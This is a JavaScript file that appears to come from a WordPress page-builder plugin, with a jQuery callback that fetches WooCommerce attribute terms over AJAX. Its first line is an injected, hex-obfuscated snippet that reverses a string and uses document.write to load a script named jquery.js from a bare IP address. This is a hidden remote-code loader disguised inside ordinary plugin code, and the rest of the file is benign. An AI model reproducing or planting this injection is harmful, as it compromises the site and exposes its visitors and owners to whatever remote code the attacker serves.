var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))if ( ! window.ajaxurl ) {
	window.ajaxurl = window.location.href;
}
var vcWoocommerceProductAttributeFilterDependencyCallback;

vcWoocommerceProductAttributeFilterDependencyCallback = function () {
	(function ( $, that ) {
		var $filterDropdown, $empty;

		$filterDropdown = $( '[data-vc-shortcode-param-name="filter"]', that.$content );
		$filterDropdown.removeClass( 'vc_dependent-hidden' );
		$empty = $( '#filter-empty', $filterDropdown );
		if ( $empty.length ) {
			$empty.parent().remove();
			$( '.edit_form_line',
				$filterDropdown ).prepend( $( '<div class="vc_checkbox-label"><span>No values found</span></div>' ) );
		}
		$( 'select[name="attribute"]', that.$content ).change( function () {
			$( '.vc_checkbox-label', $filterDropdown ).remove();
			$filterDropdown.removeClass( 'vc_dependent-hidden' );

			$.ajax( {
				type: 'POST',
				dataType: 'json',
				url: window.ajaxurl,
				data: {
					action: 'vc_woocommerce_get_attribute_terms',
					attribute: this.value,
					_vcnonce: window.vcAdminNonce
				}
			} ).done( function ( data ) {
				if ( 0 < data.length ) {
					$( '.edit_form_line', $filterDropdown ).prepend( $( data ) );
				} else {
					$( '.edit_form_line',
						$filterDropdown ).prepend( $( '<div class="vc_checkbox-label"><span>No values found</span></div>' ) );
				}
			} );
		} );
	}( window.jQuery, this ));
};
